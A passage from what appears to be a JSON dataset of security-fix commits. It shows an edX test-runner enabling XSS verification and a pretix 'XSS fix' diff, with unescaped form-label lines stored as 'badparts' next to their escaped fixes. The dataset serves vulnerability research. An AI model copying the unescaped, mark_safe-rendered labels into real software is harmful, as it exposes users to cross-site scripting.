   # a workaround for a race condition. The first time a course is created;\n            # role permissions are set up for forums.\n            CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install()\n            print 'Forums permissions/roles data has been seeded'\n        except FixtureError:\n            # this means it's already been done\n            pass\n\n        if self.serversonly:\n            self.run_servers_continuously()\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback)\n\n        # Using testsonly will leave all fixtures in place (Note: the db will also be dirtier.)\n        if self.testsonly:\n            msg = colorize('green', 'Running in testsonly mode... SKIPPING database cleanup.')\n            print msg\n        else:\n            # Clean up data we created in the databases\n            msg = colorize('green', \"Cleaning up databases...\")\n            print msg\n            sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\")\n            bokchoy_utils.clear_mongo()\n\n    def verbosity_processes_string(self):\n        \"\"\"\n        Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct\n        the proper combination for use with nosetests.\n        \"\"\"\n        substring = []\n\n        if self.verbosity != DEFAULT_VERBOSITY and self.num_processes != DEFAULT_NUM_PROCESSES:\n            msg = 'Cannot pass in both num_processors and verbosity. Quitting'\n            raise BuildFailure(msg)\n\n        if self.num_processes != 1:\n            # Construct \"multiprocess\" nosetest substring\n            substring = [\n                \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report),\n                \"--processes={}\".format(self.num_processes),\n                \"--no-color --process-timeout=1200\"\n            ]\n\n        else:\n            substring = [\n                \"--with-xunit\",\n                \"--xunit-file={}\".format(self.xunit_report),\n                \"--verbosity={}\".format(self.verbosity),\n            ]\n\n        return \" \".join(substring)\n\n    def prepare_bokchoy_run(self):\n        \"\"\"\n        Sets up and starts servers for a Bok Choy run. If --fasttest is not\n        specified then static assets are collected\n        \"\"\"\n        sh(\"{}/scripts/reset-test-db.sh\".format(Env.REPO_ROOT))\n\n        if not self.fasttest:\n            self.generate_optimized_static_assets()\n\n        # Clear any test data already in Mongo or MySQLand invalidate\n        # the cache\n        bokchoy_utils.clear_mongo()\n        self.cache.flush_all()\n\n        # load data in db_fixtures\n        self.load_data()\n\n        # load courses if self.imports_dir is set\n        self.load_courses()\n\n        # Ensure the test servers are available\n        msg = colorize('green', \"Confirming servers are running...\")\n        print msg\n        bokchoy_utils.start_servers(self.default_store, self.coveragerc)\n\n    def load_courses(self):\n        \"\"\"\n        Loads courses from self.imports_dir.\n\n        Note: self.imports_dir is the directory that contains the directories\n        that have courses in them. For example, if the course is located in\n        `test_root/courses/test-example-course/`, self.imports_dir should be\n        `test_root/courses/`.\n        \"\"\"\n        msg = colorize('green', \"Importing courses from {}...\".format(self.imports_dir))\n        print msg\n\n        if self.imports_dir:\n            sh(\n                \"DEFAULT_STORE={default_store}\"\n                \" ./manage.py cms --settings=bok_choy import {import_dir}\".format(\n                    default_store=self.default_store,\n                    import_dir=self.imports_dir\n                )\n            )\n\n    def load_data(self):\n        \"\"\"\n        Loads data into database from db_fixtures\n        \"\"\"\n        print 'Loading data from json fixtures in db_fixtures directory'\n        sh(\n            \"DEFAULT_STORE={default_store}\"\n            \" ./manage.py lms --settings bok_choy loaddata --traceback\"\n            \" common/test/db_fixtures/*.json\".format(\n                default_store=self.default_store,\n            )\n        )\n\n    def run_servers_continuously(self):\n        \"\"\"\n        Infinite loop. Servers will continue to run in the current session unless interrupted.\n        \"\"\"\n        print 'Bok-choy servers running. Press Ctrl-C to exit...\\n'\n        print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n'\n\n        while True:\n            try:\n                sleep(10000)\n            except KeyboardInterrupt:\n                print \"Stopping bok-choy servers.\\n\"\n                break\n\n    @property\n    def cmd(self):\n        \"\"\"\n        This method composes the nosetests command to send to the terminal. If nosetests aren't being run,\n         the command returns an empty string.\n        \"\"\"\n        # Default to running all tests if no specific test is specified\n        if not self.test_spec:\n            test_spec = self.test_dir\n        else:\n            test_spec = self.test_dir / self.test_spec\n\n        # Skip any additional commands (such as nosetests) if running in\n        # servers only mode\n        if self.serversonly:\n            return \"\"\n\n        # Construct the nosetests command, specifying where to save\n        # screenshots and XUnit XML reports\n        cmd = [\n            \"DEFAULT_STORE={}\".format(self.default_store),\n            \"SCREENSHOT_DIR='{}'\".format(self.log_dir),\n            \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir),\n            \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file),\n            \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir),\n            \"VERIFY_XSS='{}'\".format(self.verify_xss),\n            \"nosetests\",\n            test_spec,\n            \"{}\".format(self.verbosity_processes_string())\n        ]\n        if self.pdb:\n            cmd.append(\"--pdb\")\n        if self.save_screenshots:\n            cmd.append(\"--with-save-baseline\")\n        cmd.append(self.extra_args)\n\n        cmd = (\" \").join(cmd)\n        return cmd\n\n\nclass Pa11yCrawler(BokChoyTestSuite):\n    \"\"\"\n    Sets up test environment with mega-course loaded, and runs pa11ycralwer\n    against it.\n    \"\"\"\n\n    def __init__(self, *args, **kwargs):\n        super(Pa11yCrawler, self).__init__(*args, **kwargs)\n        self.course_key = kwargs.get('course_key')\n        if self.imports_dir:\n            # If imports_dir has been specified, assume the files are\n            # already there -- no need to fetch them from github. This\n            # allows someome to crawl a different course. They are responsible\n            # for putting it, un-archived, in the directory.\n            self.should_fetch_course = False\n        else:\n            # Otherwise, obey `--skip-fetch` command and use the default\n            # test course.  Note that the fetch will also be skipped when\n            # using `--fast`.\n            self.should_fetch_course = kwargs.get('should_fetch_course')\n            self.imports_dir = path('test_root/courses/')\n\n        self.pa11y_report_dir = os.path.join(self.report_dir, 'pa11ycrawler_reports')\n        self.tar_gz_file = \"https://github.com/edx/demo-test-course/archive/master.tar.gz\"\n\n        self.start_urls = []\n        auto_auth_params = {\n            \"redirect\": 'true',\n            \"staff\": 'true',\n            \"course_id\": self.course_key,\n        }\n        cms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params))\n\n        sequence_url = \"/api/courses/v1/blocks/?{}\".format(\n            urlencode({\n                \"course_id\": self.course_key,\n                \"depth\": \"all\",\n                \"all_blocks\": \"true\",\n            })\n        )\n        auto_auth_params.update({'redirect_to': sequence_url})\n        lms_params = urlencode(auto_auth_params)\n        self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params))\n\n    def __enter__(self):\n        if self.should_fetch_course:\n            self.get_test_course()\n        super(Pa11yCrawler, self).__enter__()\n\n    def get_test_course(self):\n        \"\"\"\n        Fetches the test course.\n        \"\"\"\n        self.imports_dir.makedirs_p()\n        zipped_course = self.imports_dir + 'demo_course.tar.gz'\n\n        msg = colorize('green', \"Fetching the test course from github...\")\n        print msg\n\n        sh(\n            'wget {tar_gz_file} -O {zipped_course}'.format(\n                tar_gz_file=self.tar_gz_file,\n                zipped_course=zipped_course,\n            )\n        )\n\n        msg = colorize('green', \"Uncompressing the test course...\")\n        print msg\n\n        sh(\n            'tar zxf {zipped_course} -C {courses_dir}'.format(\n                zipped_course=zipped_course,\n                courses_dir=self.imports_dir,\n            )\n        )\n\n    def generate_html_reports(self):\n        \"\"\"\n        Runs pa11ycrawler json-to-html\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={report_dir}'\n        ).format(report_dir=self.pa11y_report_dir)\n\n        sh(cmd_str)\n\n    @property\n    def cmd(self):\n        \"\"\"\n        Runs pa11ycrawler as staff user against the test course.\n        \"\"\"\n        cmd_str = (\n            'pa11ycrawler run {start_urls} '\n            '--pa11ycrawler-allowed-domains={allowed_domains} '\n            '--pa11ycrawler-reports-dir={report_dir} '\n            '--pa11ycrawler-deny-url-matcher={dont_go_here} '\n            '--pa11y-reporter=\"{reporter}\" '\n            '--depth-limit={depth} '\n        ).format(\n            start_urls=' '.join(self.start_urls),\n            allowed_domains='localhost',\n            report_dir=self.pa11y_report_dir,\n            reporter=\"1.0-json\",\n            dont_go_here=\"logout\",\n            depth=\"6\",\n        )\n        return cmd_str\n"
                }
            },
            "msg": "Enable VERIFY_XSS checking by default."
        }
    },
    "https://github.com/pretix/pretix": {
        "affc6254a8316643d4afe9e8b7f8cd288c86ca1f": {
            "url": "https://api.github.com/repos/pretix/pretix/commits/affc6254a8316643d4afe9e8b7f8cd288c86ca1f",
            "html_url": "https://github.com/pretix/pretix/commit/affc6254a8316643d4afe9e8b7f8cd288c86ca1f",
            "sha": "affc6254a8316643d4afe9e8b7f8cd288c86ca1f",
            "keyword": "XSS fix",
            "diff": "diff --git a/src/pretix/base/forms/questions.py b/src/pretix/base/forms/questions.py\nindex 5023f61d2..d8b3ef4c2 100644\n--- a/src/pretix/base/forms/questions.py\n+++ b/src/pretix/base/forms/questions.py\n@@ -9,6 +9,7 @@\n from django import forms\n from django.contrib import messages\n from django.core.exceptions import ValidationError\n+from django.utils.html import escape\n from django.utils.safestring import mark_safe\n from django.utils.translation import ugettext_lazy as _\n \n@@ -171,6 +172,7 @@ def __init__(self, *args, **kwargs):\n                 initial = None\n             tz = pytz.timezone(event.settings.timezone)\n             help_text = rich_text(q.help_text)\n+            label = escape(q.question)  # django-bootstrap3 calls mark_safe\n             if q.type == Question.TYPE_BOOLEAN:\n                 if q.required:\n                     # For some reason, django-bootstrap3 does not set the required attribute\n@@ -185,26 +187,26 @@ def __init__(self, *args, **kwargs):\n                     initialbool = False\n \n                 field = forms.BooleanField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initialbool, widget=widget,\n                 )\n             elif q.type == Question.TYPE_NUMBER:\n                 field = forms.DecimalField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=q.help_text,\n                     initial=initial.answer if initial else None,\n                     min_value=Decimal('0.00'),\n                 )\n             elif q.type == Question.TYPE_STRING:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.answer if initial else None,\n                 )\n             elif q.type == Question.TYPE_TEXT:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Textarea,\n                     initial=initial.answer if initial else None,\n@@ -212,7 +214,7 @@ def __init__(self, *args, **kwargs):\n             elif q.type == Question.TYPE_CHOICE:\n                 field = forms.ModelChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Select,\n                     empty_label='',\n@@ -221,35 +223,35 @@ def __init__(self, *args, **kwargs):\n             elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                 field = forms.ModelMultipleChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.CheckboxSelectMultiple,\n                     initial=initial.options.all() if initial else None,\n                 )\n             elif q.type == Question.TYPE_FILE:\n                 field = forms.FileField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.file if initial else None,\n                     widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                 )\n             elif q.type == Question.TYPE_DATE:\n                 field = forms.DateField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                     widget=DatePickerWidget(),\n                 )\n             elif q.type == Question.TYPE_TIME:\n                 field = forms.TimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                     widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                 )\n             elif q.type == Question.TYPE_DATETIME:\n                 field = SplitDateTimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                     widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n",
            "message": "",
            "files": {
                "/src/pretix/base/forms/questions.py": {
                    "changes": [
                        {
                            "diff": "\n                     initialbool = False\n \n                 field = forms.BooleanField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initialbool, widget=widget,\n                 )\n             elif q.type == Question.TYPE_NUMBER:\n                 field = forms.DecimalField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=q.help_text,\n                     initial=initial.answer if initial else None,\n                     min_value=Decimal('0.00'),\n                 )\n             elif q.type == Question.TYPE_STRING:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.answer if initial else None,\n                 )\n             elif q.type == Question.TYPE_TEXT:\n                 field = forms.CharField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Textarea,\n                     initial=initial.answer if initial else None,\n",
                            "add": 4,
                            "remove": 4,
                            "filename": "/src/pretix/base/forms/questions.py",
                            "badparts": [
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,"
                            ],
                            "goodparts": [
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,"
                            ]
                        },
                        {
                            "diff": "\n             elif q.type == Question.TYPE_CHOICE:\n                 field = forms.ModelChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.Select,\n                     empty_label='',\n",
                            "add": 1,
                            "remove": 1,
                            "filename": "/src/pretix/base/forms/questions.py",
                            "badparts": [
                                "                    label=q.question, required=q.required,"
                            ],
                            "goodparts": [
                                "                    label=label, required=q.required,"
                            ]
                        },
                        {
                            "diff": "\n             elif q.type == Question.TYPE_CHOICE_MULTIPLE:\n                 field = forms.ModelMultipleChoiceField(\n                     queryset=q.options,\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     widget=forms.CheckboxSelectMultiple,\n                     initial=initial.options.all() if initial else None,\n                 )\n             elif q.type == Question.TYPE_FILE:\n                 field = forms.FileField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=initial.file if initial else None,\n                     widget=UploadedFileWidget(position=pos, event=event, answer=initial),\n                 )\n             elif q.type == Question.TYPE_DATE:\n                 field = forms.DateField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None,\n                     widget=DatePickerWidget(),\n                 )\n             elif q.type == Question.TYPE_TIME:\n                 field = forms.TimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None,\n                     widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n                 )\n             elif q.type == Question.TYPE_DATETIME:\n                 field = SplitDateTimeField(\n-                    label=q.question, required=q.required,\n+                    label=label, required=q.required,\n                     help_text=help_text,\n                     initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None,\n                     widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')),\n",
                            "add": 5,
                            "remove": 5,
                            "filename": "/src/pretix/base/forms/questions.py",
                            "badparts": [
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,",
                                "                    label=q.question, required=q.required,"
                            ],
                            "goodparts": [
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,",
                                "                    label=label, required=q.required,"
                            ]
                        }
                    ],
                    "source": "\nimport copy import logging from decimal import Decimal import dateutil.parser import pytz import vat_moss.errors import vat_moss.id from django import forms from django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base.forms.widgets import( BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget, TimePickerWidget, UploadedFileWidget, ) from pretix.base.models import InvoiceAddress, Question from pretix.base.models.tax import EU_COUNTRIES from pretix.base.settings import PERSON_NAME_SCHEMES from pretix.base.templatetags.rich_text import rich_text from pretix.control.forms import SplitDateTimeField from pretix.helpers.i18n import get_format_without_seconds from pretix.presale.signals import question_form_fields logger=logging.getLogger(__name__) class NamePartsWidget(forms.MultiWidget): widget=forms.TextInput def __init__(self, scheme: dict, field: forms.Field, attrs=None): widgets=[] self.scheme=scheme self.field=field for fname, label, size in self.scheme['fields']: a=copy.copy(attrs) or{} a['data-fname']=fname widgets.append(self.widget(attrs=a)) super().__init__(widgets, attrs) def decompress(self, value): if value is None: return None data=[] for i, field in enumerate(self.scheme['fields']): fname, label, size=field data.append(value.get(fname, \"\")) if '_legacy' in value and not data[-1]: data[-1]=value.get('_legacy', '') return data def render(self, name: str, value, attrs=None, renderer=None) -> str: if not isinstance(value, list): value=self.decompress(value) output=[] final_attrs=self.build_attrs(attrs or dict()) if 'required' in final_attrs: del final_attrs['required'] id_=final_attrs.get('id', None) for i, widget in enumerate(self.widgets): try: widget_value=value[i] except(IndexError, TypeError): widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_, i), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data-size']=self.scheme['fields'][i][2] output.append(widget.render(name +'_%s' % i, widget_value, final_attrs, renderer=renderer)) return mark_safe(self.format_output(output)) def format_output(self, rendered_widgets) -> str: return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets) class NamePartsFormField(forms.MultiValueField): widget=NamePartsWidget def compress(self, data_list) -> dict: data={} data['_scheme']=self.scheme_name for i, value in enumerate(data_list): data[self.scheme['fields'][i][0]]=value or '' return data def __init__(self, *args, **kwargs): fields=[] defaults={ 'widget': self.widget, 'max_length': kwargs.pop('max_length', None), } self.scheme_name=kwargs.pop('scheme') self.scheme=PERSON_NAME_SCHEMES.get(self.scheme_name) self.one_required=kwargs.get('required', True) require_all_fields=kwargs.pop('require_all_fields', False) kwargs['required']=False kwargs['widget']=(kwargs.get('widget') or self.widget)( scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs',{}) ) defaults.update(**kwargs) for fname, label, size in self.scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self.require_all_fields=require_all_fields self.required=self.one_required def clean(self, value) -> dict: value=super().clean(value) if self.one_required and(not value or not any(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code='required') return value class BaseQuestionsForm(forms.Form): \"\"\" This form class is responsible for asking order-related questions. This includes the attendee name for admission tickets, if the corresponding setting is enabled, as well as additional questions defined by the organizer. \"\"\" def __init__(self, *args, **kwargs): \"\"\" Takes two additional keyword arguments: :param cartpos: The cart position the form should be for :param event: The event this belongs to \"\"\" cartpos=self.cartpos=kwargs.pop('cartpos', None) orderpos=self.orderpos=kwargs.pop('orderpos', None) pos=cartpos or orderpos item=pos.item questions=pos.item.questions_to_ask event=kwargs.pop('event') super().__init__(*args, **kwargs) if item.admission and event.settings.attendee_names_asked: self.fields['attendee_name_parts']=NamePartsFormField( max_length=255, required=event.settings.attendee_names_required, scheme=event.settings.name_scheme, label=_('Attendee name'), initial=(cartpos.attendee_name_parts if cartpos else orderpos.attendee_name_parts), ) if item.admission and event.settings.attendee_emails_asked: self.fields['attendee_email']=forms.EmailField( required=event.settings.attendee_emails_required, label=_('Attendee email'), initial=(cartpos.attendee_email if cartpos else orderpos.attendee_email) ) for q in questions: answers=[a for a in pos.answerlist if a.question_id==q.id] if answers: initial=answers[0] else: initial=None tz=pytz.timezone(event.settings.timezone) help_text=rich_text(q.help_text) if q.type==Question.TYPE_BOOLEAN: if q.required: widget=forms.CheckboxInput(attrs={'required': 'required'}) else: widget=forms.CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial=initialbool, widget=widget, ) elif q.type==Question.TYPE_NUMBER: field=forms.DecimalField( label=q.question, required=q.required, help_text=q.help_text, initial=initial.answer if initial else None, min_value=Decimal('0.00'), ) elif q.type==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, widget=forms.Textarea, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='', initial=initial.options.first() if initial else None, ) elif q.type==Question.TYPE_CHOICE_MULTIPLE: field=forms.ModelMultipleChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.CheckboxSelectMultiple, initial=initial.options.all() if initial else None, ) elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event=event, answer=initial), ) elif q.type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer else None, widget=DatePickerWidget(), ) elif q.type==Question.TYPE_TIME: field=forms.TimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).time() if initial and initial.answer else None, widget=TimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) elif q.type==Question.TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None, widget=SplitDateTimePickerWidget(time_format=get_format_without_seconds('TIME_INPUT_FORMATS')), ) field.question=q if answers: field.answer=answers[0] self.fields['question_%s' % q.id]=field responses=question_form_fields.send(sender=event, position=pos) data=pos.meta_info_data for r, response in sorted(responses, key=lambda r: str(r[0])): for key, value in response.items(): self.fields[key]=value value.initial=data.get('question_form_data',{}).get(key) class BaseInvoiceAddressForm(forms.ModelForm): vat_warning=False class Meta: model=InvoiceAddress fields=('is_business', 'company', 'name_parts', 'street', 'zipcode', 'city', 'country', 'vat_id', 'internal_reference', 'beneficiary') widgets={ 'is_business': BusinessBooleanRadio, 'street': forms.Textarea(attrs={'rows': 2, 'placeholder': _('Street and Number')}), 'beneficiary': forms.Textarea(attrs={'rows': 3}), 'company': forms.TextInput(attrs={'data-display-dependency': ' 'vat_id': forms.TextInput(attrs={'data-display-dependency': ' 'internal_reference': forms.TextInput, } labels={ 'is_business': '' } def __init__(self, *args, **kwargs): self.event=event=kwargs.pop('event') self.request=kwargs.pop('request', None) self.validate_vat_id=kwargs.pop('validate_vat_id') self.all_optional=kwargs.pop('all_optional', False) super().__init__(*args, **kwargs) if not event.settings.invoice_address_vatid: del self.fields['vat_id'] if not event.settings.invoice_address_required or self.all_optional: for k, f in self.fields.items(): f.required=False f.widget.is_required=False if 'required' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'].required=True self.fields['company'].widget.is_required=True self.fields['company'].widget.attrs['required']='required' del self.fields['company'].widget.attrs['data-display-dependency'] if 'vat_id' in self.fields: del self.fields['vat_id'].widget.attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings.invoice_name_required and not self.all_optional, scheme=event.settings.name_scheme, label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required and not self.all_optional: self.fields['name_parts'].widget.attrs['data-required-if']=' self.fields['name_parts'].widget.attrs['data-no-required-attr']='1' self.fields['company'].widget.attrs['data-required-if']=' if not event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required: if data.get('is_business') and not data.get('company'): raise ValidationError(_('You need to provide a company name.')) if not data.get('is_business') and not data.get('name_parts'): raise ValidationError(_('You need to provide your name.')) if 'vat_id' in self.changed_data or not data.get('vat_id'): self.instance.vat_id_validated=False self.instance.name_parts=data.get('name_parts') if self.validate_vat_id and self.instance.vat_id_validated and 'vat_id' not in self.changed_data: pass elif self.validate_vat_id and data.get('is_business') and data.get('country') in EU_COUNTRIES and data.get('vat_id'): if data.get('vat_id')[:2] !=str(data.get('country')): raise ValidationError(_('Your VAT ID does not match the selected country.')) try: result=vat_moss.id.validate(data.get('vat_id')) if result: country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT ID is not valid. Please re-check your input.')) except vat_moss.errors.WebServiceUnavailableError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount ' 'back via the VAT reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country returned an incorrect result. We will therefore ' 'need to charge VAT on your invoice. Please contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super().__init__(*args, **kwargs) for f in list(self.fields.keys()): if f !='name': del self.fields[f] ",
                    "sourceWithComments": "import copy\nimport logging\nfrom decimal import Decimal\n\nimport dateutil.parser\nimport pytz\nimport vat_moss.errors\nimport vat_moss.id\nfrom django import forms\nfrom django.contrib import messages\nfrom django.core.exceptions import ValidationError\nfrom django.utils.safestring import mark_safe\nfrom django.utils.translation import ugettext_lazy as _\n\nfrom pretix.base.forms.widgets import (\n    BusinessBooleanRadio, DatePickerWidget, SplitDateTimePickerWidget,\n    TimePickerWidget, UploadedFileWidget,\n)\nfrom pretix.base.models import InvoiceAddress, Question\nfrom pretix.base.models.tax import EU_COUNTRIES\nfrom pretix.base.settings import PERSON_NAME_SCHEMES\nfrom pretix.base.templatetags.rich_text import rich_text\nfrom pretix.control.forms import SplitDateTimeField\nfrom pretix.helpers.i18n import get_format_without_seconds\nfrom pretix.presale.signals import question_form_fields\n\nlogger = logging.getLogger(__name__)\n\n\nclass NamePartsWidget(forms.MultiWidget):\n    widget = forms.TextInput\n\n    def __init__(self, scheme: dict, field: forms.Field, attrs=None):\n        widgets = []\n        self.scheme = scheme\n        self.field = field\n        for fname, label, size in self.scheme['fields']:\n            a = copy.copy(attrs) or {}\n            a['data-fname'] = fname\n            widgets.append(self.widget(attrs=a))\n        super().__init__(widgets, attrs)\n\n    def decompress(self, value):\n        if value is None:\n            return None\n        data = []\n        for i, field in enumerate(self.scheme['fields']):\n            fname, label, size = field\n            data.append(value.get(fname, \"\"))\n        if '_legacy' in value and not data[-1]:\n            data[-1] = value.get('_legacy', '')\n        return data\n\n    def render(self, name: str, value, attrs=None, renderer=None) -> str:\n        if not isinstance(value, list):\n            value = self.decompress(value)\n        output = []\n        final_attrs = self.build_attrs(attrs or dict())\n        if 'required' in final_attrs:\n            del final_attrs['required']\n        id_ = final_attrs.get('id', None)\n        for i, widget in enumerate(self.widgets):\n            try:\n                widget_value = value[i]\n            except (IndexError, TypeError):\n                widget_value = None\n            if id_:\n                final_attrs = dict(\n                    final_attrs,\n                    id='%s_%s' % (id_, i),\n                    title=self.scheme['fields'][i][1],\n                    placeholder=self.scheme['fields'][i][1],\n                )\n                final_attrs['data-size'] = self.scheme['fields'][i][2]\n            output.append(widget.render(name + '_%s' % i, widget_value, final_attrs, renderer=renderer))\n        return mark_safe(self.format_output(output))\n\n    def format_output(self, rendered_widgets) -> str:\n        return '<div class=\"nameparts-form-group\">%s</div>' % ''.join(rendered_widgets)\n\n\nclass NamePartsFormField(forms.MultiValueField):\n    widget = NamePartsWidget\n\n    def compress(self, data_list) -> dict:\n        data = {}\n        data['_scheme'] = self.scheme_name\n        for i, value in enumerate(data_list):\n            data[self.scheme['fields'][i][0]] = value or ''\n        return data\n\n    def __init__(self, *args, **kwargs):\n        fields = []\n        defaults = {\n            'widget': self.widget,\n            'max_length': kwargs.pop('max_length', None),\n        }\n        self.scheme_name = kwargs.pop('scheme')\n        self.scheme = PERSON_NAME_SCHEMES.get(self.scheme_name)\n        self.one_required = kwargs.get('required', True)\n        require_all_fields = kwargs.pop('require_all_fields', False)\n        kwargs['required'] = False\n        kwargs['widget'] = (kwargs.get('widget') or self.widget)(\n            scheme=self.scheme, field=self, **kwargs.pop('widget_kwargs', {})\n        )\n        defaults.update(**kwargs)\n        for fname, label, size in self.scheme['fields']:\n            defaults['label'] = label\n            field = forms.CharField(**defaults)\n            field.part_name = fname\n            fields.append(field)\n        super().__init__(\n            fields=fields, 